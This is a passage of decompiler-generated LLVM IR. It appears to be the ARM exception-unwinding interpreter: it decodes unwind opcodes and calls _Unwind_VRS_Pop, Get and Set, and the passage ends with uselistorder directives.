  br i1 %v2_1930c, label %dec_label_pc_19358, label %dec_label_pc_1931c

dec_label_pc_1931c:                               ; preds = %dec_label_pc_19308
  %v1_1931c = add nsw i32 %v4_19308, -1
  store i32 %v1_1931c, i32* %r3.global-to-local, align 4
  %v1_19320 = trunc i32 %v1_1931c to i8
  store i8 %v1_19320, i8* %v2_19308, align 1
  %v0_19324 = load i32, i32* @r5, align 4
  %v1_19324 = add i32 %v0_19324, 4
  %v2_19324 = inttoptr i32 %v1_19324 to i32*
  %v3_19324 = load i32, i32* %v2_19324, align 4
  store i32 %v3_19324, i32* %r2.global-to-local, align 4
  %v1_19328 = inttoptr i32 %v3_19324 to i32*
  %v2_19328 = load i32, i32* %v1_19328, align 4
  store i32 %v2_19328, i32* %r0.global-to-local, align 4
  %v4_19328 = add i32 %v3_19324, 4
  store i32 %v4_19328, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19328, i32* %v2_19324, align 4
  %v0_19334 = load i32, i32* %r3.global-to-local, align 4
  %v1_19334 = trunc i32 %v0_19334 to i8
  %v2_19334 = load i32, i32* @r5, align 4
  %v3_19334 = add i32 %v2_19334, 8
  %v4_19334 = inttoptr i32 %v3_19334 to i8*
  store i8 %v1_19334, i8* %v4_19334, align 1
  %v0_19338 = load i32, i32* %r0.global-to-local, align 4
  %v1_19338 = load i32, i32* @r5, align 4
  %v2_19338 = inttoptr i32 %v1_19338 to i32*
  store i32 %v0_19338, i32* %v2_19338, align 4
  br label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %.thread52, %dec_label_pc_1931c
  %v0_1933c = load i32, i32* %r0.global-to-local, align 4
  %v3_1933c = udiv i32 %v0_1933c, 16777216
  %v1_19340 = urem i32 %v3_1933c, 16
  %v3_19344 = mul i32 %v0_1933c, 256
  store i32 %v3_19344, i32* %r0.global-to-local, align 4
  %v1_19348 = add nuw nsw i32 %v1_19340, 1
  store i32 %v1_19348, i32* %r2.global-to-local, align 4
  %v1_1934c = and i32 %v3_1933c, 240
  store i32 %v1_1934c, i32* %r3.global-to-local, align 4
  %v1_19350 = load i32, i32* @r5, align 4
  %v2_19350 = inttoptr i32 %v1_19350 to i32*
  store i32 %v3_19344, i32* %v2_19350, align 4
  %v0_19354 = load i32, i32* %r2.global-to-local, align 4
  %v1_19354 = load i32, i32* %r3.global-to-local, align 4
  %v4_19354 = mul i32 %v1_19354, 4096
  %v5_19354 = or i32 %v4_19354, %v0_19354
  br label %dec_label_pc_19358

dec_label_pc_19358:                               ; preds = %dec_label_pc_19308, %dec_label_pc_1933c
  %storemerge130 = phi i32 [ %v5_19354, %dec_label_pc_1933c ], [ 720897, %dec_label_pc_19308 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1916c

dec_label_pc_19360:                               ; preds = %dec_label_pc_1908c
  %v0_19360 = load i32, i32* @r5, align 4
  %v1_19360 = add i32 %v0_19360, 8
  %v2_19360 = inttoptr i32 %v1_19360 to i8*
  %v3_19360 = load i8, i8* %v2_19360, align 1
  %v4_19360 = zext i8 %v3_19360 to i32
  store i32 %v4_19360, i32* %r3.global-to-local, align 4
  %v2_19364 = icmp eq i8 %v3_19360, 0
  store i1 %v2_19364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19364, label %dec_label_pc_1950c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_19360
  %v2_19368 = add nsw i32 %v4_19360, -1
  store i32 %v2_19368, i32* %r3.global-to-local, align 4
  %v2_1936c = trunc i32 %v2_19368 to i8
  store i8 %v2_1936c, i8* %v2_19360, align 1
  %v0_19370.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19370.pr.pr, label %.thread56.dec_label_pc_1950c_crit_edge, label %dec_label_pc_19374

.thread56.dec_label_pc_1950c_crit_edge:           ; preds = %.thread56
  %v0_1950c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1950c

dec_label_pc_19374:                               ; preds = %.thread56, %dec_label_pc_19518
  %v0_19374 = load i32, i32* %r0.global-to-local, align 4
  %v3_19374 = udiv i32 %v0_19374, 16777216
  store i32 %v3_19374, i32* %r3.global-to-local, align 4
  store i32 %v3_19374, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_19374, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1937c = mul i32 %v0_19374, 256
  store i32 %v3_1937c, i32* %r0.global-to-local, align 4
  %v1_19380 = load i32, i32* @r5, align 4
  %v2_19380 = inttoptr i32 %v1_19380 to i32*
  store i32 %v3_1937c, i32* %v2_19380, align 4
  br i1 %tmp184, label %dec_label_pc_1913c, label %dec_label_pc_19388

dec_label_pc_19388:                               ; preds = %dec_label_pc_19374
  %v0_19388 = load i32, i32* %r3.global-to-local, align 4
  %v1_19388 = and i32 %v0_19388, 240
  store i32 %v1_19388, i32* %r3.global-to-local, align 4
  %v2_19388 = icmp eq i32 %v1_19388, 0
  store i1 %v2_19388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19388, label %dec_label_pc_19390, label %dec_label_pc_1913c

dec_label_pc_19390:                               ; preds = %dec_label_pc_19388
  %v0_19390 = load i32, i32* @r7, align 4
  store i32 %v0_19390, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19398 = load i32, i32* %r2.global-to-local, align 4
  %v4_19398 = call i32 @_Unwind_VRS_Pop(i32 %v0_19390, i32 4, i32 %v2_19398, i32 0)
  store i32 %v4_19398, i32* %r0.global-to-local, align 4
  %v2_1939c = icmp eq i32 %v4_19398, 0
  store i1 %v2_1939c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1939c, label %dec_label_pc_18e6c.backedge, label %dec_label_pc_193a4

dec_label_pc_193a4:                               ; preds = %dec_label_pc_19390
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_193ac:                               ; preds = %dec_label_pc_191d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_193b8 = load i32, i32* @r7, align 4
  store i32 %v0_193b8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_193c4 = call i32 @_Unwind_VRS_Get(i32 %v0_193b8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_193c4, i32* %r0.global-to-local, align 4
  %v0_193c8 = load i32, i32* @r5, align 4
  %v1_193c8 = add i32 %v0_193c8, 8
  %v2_193c8 = inttoptr i32 %v1_193c8 to i8*
  %v3_193c8 = load i8, i8* %v2_193c8, align 1
  %v4_193c8 = zext i8 %v3_193c8 to i32
  store i32 %v4_193c8, i32* %r1.global-to-local, align 4
  %v2_193cc = icmp eq i8 %v3_193c8, 0
  store i1 %v2_193cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193cc, label %dec_label_pc_193dc, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_193ac
  %v2_193d0 = add nsw i32 %v4_193c8, -1
  store i32 %v2_193d0, i32* %r3.global-to-local, align 4
  %v2_193d4 = trunc i32 %v2_193d0 to i8
  store i8 %v2_193d4, i8* %v2_193c8, align 1
  %v0_193d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_193d8.pr.pr, label %.thread58.dec_label_pc_193dc_crit_edge, label %dec_label_pc_19408

.thread58.dec_label_pc_193dc_crit_edge:           ; preds = %.thread58
  %v0_193dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193dc

dec_label_pc_193dc:                               ; preds = %.thread58.dec_label_pc_193dc_crit_edge, %dec_label_pc_193ac
  %v2_193f0 = phi i32 [ %v0_193dc.pre, %.thread58.dec_label_pc_193dc_crit_edge ], [ %v0_193c8, %dec_label_pc_193ac ]
  %v1_193dc = add i32 %v2_193f0, 9
  %v2_193dc = inttoptr i32 %v1_193dc to i8*
  %v3_193dc = load i8, i8* %v2_193dc, align 1
  %v4_193dc = zext i8 %v3_193dc to i32
  store i32 %v4_193dc, i32* %r3.global-to-local, align 4
  %v2_193e0 = icmp eq i8 %v3_193dc, 0
  store i1 %v2_193e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193e0, label %bb158, label %dec_label_pc_193ec

bb158:                                            ; preds = %dec_label_pc_193dc
  %v1_193e4 = load i32, i32* @r6, align 4
  store i32 %v1_193e4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19430

dec_label_pc_193ec:                               ; preds = %dec_label_pc_193dc
  %v1_193ec = add nsw i32 %v4_193dc, -1
  store i32 %v1_193ec, i32* %r3.global-to-local, align 4
  %v1_193f0 = trunc i32 %v1_193ec to i8
  store i8 %v1_193f0, i8* %v2_193dc, align 1
  %v0_193f4 = load i32, i32* @r5, align 4
  %v1_193f4 = add i32 %v0_193f4, 4
  %v2_193f4 = inttoptr i32 %v1_193f4 to i32*
  %v3_193f4 = load i32, i32* %v2_193f4, align 4
  store i32 %v3_193f4, i32* %r2.global-to-local, align 4
  %v1_193f8 = inttoptr i32 %v3_193f4 to i32*
  %v2_193f8 = load i32, i32* %v1_193f8, align 4
  store i32 %v2_193f8, i32* %r0.global-to-local, align 4
  %v4_193f8 = add i32 %v3_193f4, 4
  store i32 %v4_193f8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19400 = inttoptr i32 %v0_193f4 to i32*
  store i32 %v2_193f8, i32* %v1_19400, align 4
  %v5_19400 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19400, i32* %v2_193f4, align 4
  %v0_19404 = load i32, i32* %r3.global-to-local, align 4
  %v1_19404 = trunc i32 %v0_19404 to i8
  %v2_19404 = load i32, i32* @r5, align 4
  %v3_19404 = add i32 %v2_19404, 8
  %v4_19404 = inttoptr i32 %v3_19404 to i8*
  store i8 %v1_19404, i8* %v4_19404, align 1
  br label %dec_label_pc_19408

dec_label_pc_19408:                               ; preds = %.thread58, %dec_label_pc_193ec
  %v0_19408 = load i32, i32* @r5, align 4
  %v1_19408 = inttoptr i32 %v0_19408 to i32*
  %v2_19408 = load i32, i32* %v1_19408, align 4
  store i32 %v2_19408, i32* %r3.global-to-local, align 4
  %v3_1940c = mul i32 %v2_19408, 256
  store i32 %v3_1940c, i32* %r0.global-to-local, align 4
  %v3_19410 = udiv i32 %v2_19408, 16777216
  store i32 %v3_19410, i32* %r2.global-to-local, align 4
  store i32 %v3_1940c, i32* %v1_19408, align 4
  %v0_19418 = load i32, i32* %r2.global-to-local, align 4
  %v1_19418 = and i32 %v0_19418, 128
  %v2_19418 = icmp eq i32 %v1_19418, 0
  store i1 %v2_19418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19418, label %.thread129, label %dec_label_pc_1942c

.thread129:                                       ; preds = %dec_label_pc_19408
  %v4_1941c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1941c, i32* %ip.global-to-local, align 4
  %v1_19420 = urem i32 %v0_19418, 256
  store i32 %v1_19420, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_194a0

dec_label_pc_1942c:                               ; preds = %dec_label_pc_19408
  %v1_1942063 = urem i32 %v0_19418, 256
  store i32 %v1_1942063, i32* %r2.global-to-local, align 4
  %v0_1942c = load i32, i32* @r5, align 4
  %v1_1942c = add i32 %v0_1942c, 8
  %v2_1942c = inttoptr i32 %v1_1942c to i8*
  %v3_1942c = load i8, i8* %v2_1942c, align 1
  %v4_1942c = zext i8 %v3_1942c to i32
  store i32 %v4_1942c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19430

dec_label_pc_19430:                               ; preds = %bb158, %dec_label_pc_1942c
  %v3_1945099 = phi i32 [ %v2_193f0, %bb158 ], [ %v0_1942c, %dec_label_pc_1942c ]
  %v0_1943892 = phi i32 [ %v1_193e4, %bb158 ], [ %v1_1942063, %dec_label_pc_1942c ]
  %v3_19430 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_19430, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19438

dec_label_pc_19438:                               ; preds = %dec_label_pc_19438.backedge, %dec_label_pc_19430
  %v3_19450 = phi i32 [ %v3_19450100, %dec_label_pc_19438.backedge ], [ %v3_1945099, %dec_label_pc_19430 ]
  %v0_1944c = phi i32 [ %v2_1943c.pre, %dec_label_pc_19438.backedge ], [ 2, %dec_label_pc_19430 ]
  %v0_1943c = phi i32 [ %v0_1943c.pre, %dec_label_pc_19438.backedge ], [ %v3_19430, %dec_label_pc_19430 ]
  %v0_19438 = phi i32 [ %v0_1943895, %dec_label_pc_19438.backedge ], [ %v0_1943892, %dec_label_pc_19430 ]
  %v1_19438 = urem i32 %v0_19438, 128
  %v7_1943c = shl i32 %v1_19438, %v0_1944c
  %v8_1943c = add i32 %v7_1943c, %v0_1943c
  store i32 %v8_1943c, i32* %ip.global-to-local, align 4
  %v0_19440 = load i32, i32* %r1.global-to-local, align 4
  %v2_19440 = icmp eq i32 %v0_19440, 0
  store i1 %v2_19440, i1* %cpsr_z.global-to-local, align 1
  %v1_19444 = add i32 %v0_19440, -1
  store i32 %v1_19444, i32* %r3.global-to-local, align 4
  store i32 %v8_1943c, i32* %stack_var_-36, align 4
  %v1_1944c = add i32 %v0_1944c, 7
  store i32 %v1_1944c, i32* @lr, align 4
  br i1 %v2_19440, label %dec_label_pc_19458, label %bb159

bb159:                                            ; preds = %dec_label_pc_19438
  %v2_19450 = trunc i32 %v1_19444 to i8
  %v4_19450 = add i32 %v3_19450, 8
  %v5_19450 = inttoptr i32 %v4_19450 to i8*
  store i8 %v2_19450, i8* %v5_19450, align 1
  %v0_19454.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19454.pr, label %.dec_label_pc_19458_crit_edge, label %dec_label_pc_19484

.dec_label_pc_19458_crit_edge:                    ; preds = %bb159
  %v0_19458.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19458

dec_label_pc_19458:                               ; preds = %.dec_label_pc_19458_crit_edge, %dec_label_pc_19438
  %v2_19470 = phi i32 [ %v0_19458.pre, %.dec_label_pc_19458_crit_edge ], [ %v3_19450, %dec_label_pc_19438 ]
  %v1_19458 = add i32 %v2_19470, 9
  %v2_19458 = inttoptr i32 %v1_19458 to i8*
  %v3_19458 = load i8, i8* %v2_19458, align 1
  %v4_19458 = zext i8 %v3_19458 to i32
  store i32 %v4_19458, i32* %r3.global-to-local, align 4
  %v2_1945c = icmp eq i8 %v3_19458, 0
  store i1 %v2_1945c, i1* %cpsr_z.global-to-local, align 1
  %v1_19460 = add nsw i32 %v4_19458, -1
  store i32 %v1_19460, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1945c, label %dec_label_pc_19438.backedge, label %dec_label_pc_1946c

dec_label_pc_1946c:                               ; preds = %dec_label_pc_19458
  %v1_1946c = add i32 %v2_19470, 4
  %v2_1946c = inttoptr i32 %v1_1946c to i32*
  %v3_1946c = load i32, i32* %v2_1946c, align 4
  store i32 %v3_1946c, i32* %r2.global-to-local, align 4
  %v1_19470 = trunc i32 %v1_19460 to i8
  store i8 %v1_19470, i8* %v2_19458, align 1
  %v0_19474 = load i32, i32* %r2.global-to-local, align 4
  %v1_19474 = inttoptr i32 %v0_19474 to i32*
  %v2_19474 = load i32, i32* %v1_19474, align 4
  store i32 %v2_19474, i32* %r0.global-to-local, align 4
  %v4_19474 = add i32 %v0_19474, 4
  store i32 %v4_19474, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1947c = load i32, i32* @r5, align 4
  %v3_1947c = add i32 %v2_1947c, 8
  %v4_1947c = inttoptr i32 %v3_1947c to i8*
  store i8 3, i8* %v4_1947c, align 1
  %v0_19480 = load i32, i32* @r5, align 4
  %v1_19480 = inttoptr i32 %v0_19480 to i32*
  %v2_19480 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19480, i32* %v1_19480, align 4
  %v3_19480 = add i32 %v0_19480, 4
  %v4_19480 = inttoptr i32 %v3_19480 to i32*
  %v5_19480 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19480, i32* %v4_19480, align 4
  br label %dec_label_pc_19484

dec_label_pc_19484:                               ; preds = %bb159, %dec_label_pc_1946c
  %v0_19484 = load i32, i32* @r5, align 4
  %v1_19484 = inttoptr i32 %v0_19484 to i32*
  %v2_19484 = load i32, i32* %v1_19484, align 4
  store i32 %v2_19484, i32* %r3.global-to-local, align 4
  %v3_19488 = udiv i32 %v2_19484, 16777216
  store i32 %v3_19488, i32* %r2.global-to-local, align 4
  %v1_1948c = and i32 %v3_19488, 128
  %v2_1948c = icmp eq i32 %v1_1948c, 0
  store i1 %v2_1948c, i1* %cpsr_z.global-to-local, align 1
  %v3_19490 = mul i32 %v2_19484, 256
  store i32 %v3_19490, i32* %r0.global-to-local, align 4
  store i32 %v3_19490, i32* %v1_19484, align 4
  %v0_19498 = load i32, i32* %r2.global-to-local, align 4
  %v1_19498 = urem i32 %v0_19498, 256
  store i32 %v1_19498, i32* %r2.global-to-local, align 4
  br i1 %v2_1948c, label %dec_label_pc_194a0.loopexit, label %dec_label_pc_194cc

dec_label_pc_194a0.loopexit:                      ; preds = %dec_label_pc_19484
  %v0_194a4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_194a8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_194a0

dec_label_pc_194a0:                               ; preds = %dec_label_pc_194a0.loopexit, %.thread129
  %v2_194a8 = phi i32 [ 2, %.thread129 ], [ %v2_194a8.pre, %dec_label_pc_194a0.loopexit ]
  %v0_194a4 = phi i32 [ %v4_1941c, %.thread129 ], [ %v0_194a4.pre, %dec_label_pc_194a0.loopexit ]
  %v0_194a0 = phi i32 [ %v1_19420, %.thread129 ], [ %v1_19498, %dec_label_pc_194a0.loopexit ]
  %v1_194a0 = urem i32 %v0_194a0, 128
  %v1_194a4 = add i32 %v0_194a4, 516
  %v7_194a8 = shl i32 %v1_194a0, %v2_194a8
  %v8_194a8 = add i32 %v1_194a4, %v7_194a8
  store i32 %v8_194a8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_194b0 = load i32, i32* @r7, align 4
  store i32 %v0_194b0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_194a8, i32* %stack_var_-36, align 4
  %v5_194c4 = call i32 @_Unwind_VRS_Set(i32 %v0_194b0, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_194c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e6c.backedge

dec_label_pc_194cc:                               ; preds = %dec_label_pc_19484
  %v0_194cc = load i32, i32* @r5, align 4
  %v1_194cc = add i32 %v0_194cc, 8
  %v2_194cc = inttoptr i32 %v1_194cc to i8*
  %v3_194cc = load i8, i8* %v2_194cc, align 1
  %v4_194cc = zext i8 %v3_194cc to i32
  store i32 %v4_194cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19438.backedge

dec_label_pc_19438.backedge:                      ; preds = %dec_label_pc_194cc, %dec_label_pc_19458
  %v3_19450100 = phi i32 [ %v0_194cc, %dec_label_pc_194cc ], [ %v2_19470, %dec_label_pc_19458 ]
  %v0_1943895 = phi i32 [ %v1_19498, %dec_label_pc_194cc ], [ 176, %dec_label_pc_19458 ]
  %v0_1943c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1943c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19438

dec_label_pc_194d4:                               ; preds = %dec_label_pc_191d0
  %v0_194d4 = load i32, i32* @r5, align 4
  %v1_194d4 = add i32 %v0_194d4, 8
  %v2_194d4 = inttoptr i32 %v1_194d4 to i8*
  %v3_194d4 = load i8, i8* %v2_194d4, align 1
  %v4_194d4 = zext i8 %v3_194d4 to i32
  store i32 %v4_194d4, i32* %r3.global-to-local, align 4
  %v2_194d8 = icmp eq i8 %v3_194d4, 0
  store i1 %v2_194d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194d8, label %dec_label_pc_1953c, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_194d4
  %v2_194dc = add nsw i32 %v4_194d4, -1
  store i32 %v2_194dc, i32* %r3.global-to-local, align 4
  %v2_194e0 = trunc i32 %v2_194dc to i8
  store i8 %v2_194e0, i8* %v2_194d4, align 1
  %v0_194e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_194e4.pr.pr, label %.thread66.dec_label_pc_1953c_crit_edge, label %dec_label_pc_194e8

.thread66.dec_label_pc_1953c_crit_edge:           ; preds = %.thread66
  %v0_1953c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1953c

dec_label_pc_194e8:                               ; preds = %.thread66, %dec_label_pc_19548
  %v0_194e8 = load i32, i32* %r0.global-to-local, align 4
  %v3_194e8 = udiv i32 %v0_194e8, 16777216
  store i32 %v3_194e8, i32* %r3.global-to-local, align 4
  store i32 %v3_194e8, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_194e8, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_194f0 = mul i32 %v0_194e8, 256
  store i32 %v3_194f0, i32* %r0.global-to-local, align 4
  %v1_194f4 = load i32, i32* @r5, align 4
  %v2_194f4 = inttoptr i32 %v1_194f4 to i32*
  store i32 %v3_194f0, i32* %v2_194f4, align 4
  br i1 %tmp185, label %dec_label_pc_1913c, label %dec_label_pc_194fc

dec_label_pc_194fc:                               ; preds = %dec_label_pc_194e8
  %v0_194fc = load i32, i32* %r3.global-to-local, align 4
  %v1_194fc = and i32 %v0_194fc, 240
  store i32 %v1_194fc, i32* %r1.global-to-local, align 4
  %v2_194fc = icmp eq i32 %v1_194fc, 0
  store i1 %v2_194fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194fc, label %dec_label_pc_194fc.dec_label_pc_1916c_crit_edge, label %dec_label_pc_19504

dec_label_pc_194fc.dec_label_pc_1916c_crit_edge:  ; preds = %dec_label_pc_194fc
  %v2_19174.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1916c

dec_label_pc_19504:                               ; preds = %dec_label_pc_194fc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_1950c:                               ; preds = %.thread56.dec_label_pc_1950c_crit_edge, %dec_label_pc_19360
  %v2_1951c = phi i32 [ %v0_1950c.pre, %.thread56.dec_label_pc_1950c_crit_edge ], [ %v0_19360, %dec_label_pc_19360 ]
  %v1_1950c = add i32 %v2_1951c, 9
  %v2_1950c = inttoptr i32 %v1_1950c to i8*
  %v3_1950c = load i8, i8* %v2_1950c, align 1
  %v4_1950c = zext i8 %v3_1950c to i32
  store i32 %v4_1950c, i32* %r3.global-to-local, align 4
  %v2_19510 = icmp eq i8 %v3_1950c, 0
  store i1 %v2_19510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19510, label %dec_label_pc_1913c, label %dec_label_pc_19518

dec_label_pc_19518:                               ; preds = %dec_label_pc_1950c
  %v1_19518 = add nsw i32 %v4_1950c, -1
  store i32 %v1_19518, i32* %r3.global-to-local, align 4
  %v1_1951c = trunc i32 %v1_19518 to i8
  store i8 %v1_1951c, i8* %v2_1950c, align 1
  %v0_19520 = load i32, i32* @r5, align 4
  %v1_19520 = add i32 %v0_19520, 4
  %v2_19520 = inttoptr i32 %v1_19520 to i32*
  %v3_19520 = load i32, i32* %v2_19520, align 4
  store i32 %v3_19520, i32* %r2.global-to-local, align 4
  %v1_19524 = inttoptr i32 %v3_19520 to i32*
  %v2_19524 = load i32, i32* %v1_19524, align 4
  store i32 %v2_19524, i32* %r0.global-to-local, align 4
  %v4_19524 = add i32 %v3_19520, 4
  store i32 %v4_19524, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19524, i32* %v2_19520, align 4
  %v0_19530 = load i32, i32* %r3.global-to-local, align 4
  %v1_19530 = trunc i32 %v0_19530 to i8
  %v2_19530 = load i32, i32* @r5, align 4
  %v3_19530 = add i32 %v2_19530, 8
  %v4_19530 = inttoptr i32 %v3_19530 to i8*
  store i8 %v1_19530, i8* %v4_19530, align 1
  %v0_19534 = load i32, i32* %r0.global-to-local, align 4
  %v1_19534 = load i32, i32* @r5, align 4
  %v2_19534 = inttoptr i32 %v1_19534 to i32*
  store i32 %v0_19534, i32* %v2_19534, align 4
  br label %dec_label_pc_19374

dec_label_pc_1953c:                               ; preds = %.thread66.dec_label_pc_1953c_crit_edge, %dec_label_pc_194d4
  %v2_1954c = phi i32 [ %v0_1953c.pre, %.thread66.dec_label_pc_1953c_crit_edge ], [ %v0_194d4, %dec_label_pc_194d4 ]
  %v1_1953c = add i32 %v2_1954c, 9
  %v2_1953c = inttoptr i32 %v1_1953c to i8*
  %v3_1953c = load i8, i8* %v2_1953c, align 1
  %v4_1953c = zext i8 %v3_1953c to i32
  store i32 %v4_1953c, i32* %r3.global-to-local, align 4
  %v2_19540 = icmp eq i8 %v3_1953c, 0
  store i1 %v2_19540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19540, label %dec_label_pc_1913c, label %dec_label_pc_19548

dec_label_pc_19548:                               ; preds = %dec_label_pc_1953c
  %v1_19548 = add nsw i32 %v4_1953c, -1
  store i32 %v1_19548, i32* %r3.global-to-local, align 4
  %v1_1954c = trunc i32 %v1_19548 to i8
  store i8 %v1_1954c, i8* %v2_1953c, align 1
  %v0_19550 = load i32, i32* @r5, align 4
  %v1_19550 = add i32 %v0_19550, 4
  %v2_19550 = inttoptr i32 %v1_19550 to i32*
  %v3_19550 = load i32, i32* %v2_19550, align 4
  store i32 %v3_19550, i32* %r2.global-to-local, align 4
  %v1_19554 = inttoptr i32 %v3_19550 to i32*
  %v2_19554 = load i32, i32* %v1_19554, align 4
  store i32 %v2_19554, i32* %r0.global-to-local, align 4
  %v4_19554 = add i32 %v3_19550, 4
  store i32 %v4_19554, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19554, i32* %v2_19550, align 4
  %v0_19560 = load i32, i32* %r3.global-to-local, align 4
  %v1_19560 = trunc i32 %v0_19560 to i8
  %v2_19560 = load i32, i32* @r5, align 4
  %v3_19560 = add i32 %v2_19560, 8
  %v4_19560 = inttoptr i32 %v3_19560 to i8*
  store i8 %v1_19560, i8* %v4_19560, align 1
  %v0_19564 = load i32, i32* %r0.global-to-local, align 4
  %v1_19564 = load i32, i32* @r5, align 4
  %v2_19564 = inttoptr i32 %v1_19564 to i32*
  store i32 %v0_19564, i32* %v2_19564, align 4
  br label %dec_label_pc_194e8

; uselistorder directives
  uselistorder i32 %v3_194f0, { 1, 0 }
  uselistorder i1 %tmp185, { 1, 0 }
  uselistorder i32 %v3_194e8, { 1, 0 }
  uselistorder i32 %v0_194e8, { 1, 0, 2 }
  uselistorder i32 %v1_19498, { 1, 2, 0 }
  uselistorder i32 %v3_19490, { 1, 0 }
  uselistorder i32 %v3_19488, { 1, 0 }
  uselistorder i32 %v2_19470, { 2, 0, 1 }
  uselistorder i32 %v1_1942063, { 1, 0 }
  uselistorder i32 %v1_19420, { 1, 0 }
  uselistorder i32 %v3_1940c, { 1, 0 }
  uselistorder i32 %v2_19408, { 1, 0, 2 }
  uselistorder i32 %v3_1937c, { 1, 0 }
  uselistorder i1 %tmp184, { 1, 0 }
  uselistorder i32 %v3_19374, { 1, 0 }
  uselistorder i32 %v0_19374, { 1, 0, 2 }
  uselistorder i32 %storemerge130, { 1, 0 }
  uselistorder i32 %v3_19344, { 1, 0 }
  uselistorder i32 %storemerge131, { 1, 0 }
  uselistorder i32 %v3_192d8, { 1, 0 }
  uselistorder i32 %v0_19280, { 3, 2, 1, 0 }
  uselistorder i32 %v2_19278, { 1, 0 }
  uselistorder i32 %v2_19270, { 1, 0 }
  uselistorder i32 %storemerge132, { 1, 0 }
  uselistorder i32 %v3_19238, { 1, 0 }
  uselistorder i32 %v0_19170, { 2, 1, 0 }
  uselistorder i32 %v1_19150, { 1, 0 }
  uselistorder i32 %v0_19084, { 1, 0 }
  uselistorder i32 %v0_19070, { 1, 0, 2, 3 }
  uselistorder i1 %v2_19008, { 1, 0 }
  uselistorder i32 %v1_19004, { 2, 1, 0 }
  uselistorder i32 %storemerge135, { 1, 0 }
  uselistorder i32 %v3_18fa4, { 1, 0 }
  uselistorder i32 %v4_18f7c, { 1, 0 }
  uselistorder i1 %v2_18f6c, { 1, 0 }
  uselistorder i32 %v3_18f38, { 1, 0 }
  uselistorder i32 %v3_18f20, { 1, 0 }
  uselistorder i32 %v0_18ec4, { 0, 6, 1, 8, 5, 2, 7, 3, 4, 9, 10 }
  uselistorder i32 %v3_18eb4, { 1, 0 }
  uselistorder i32 %v3_18eac, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3, 4, 5 }
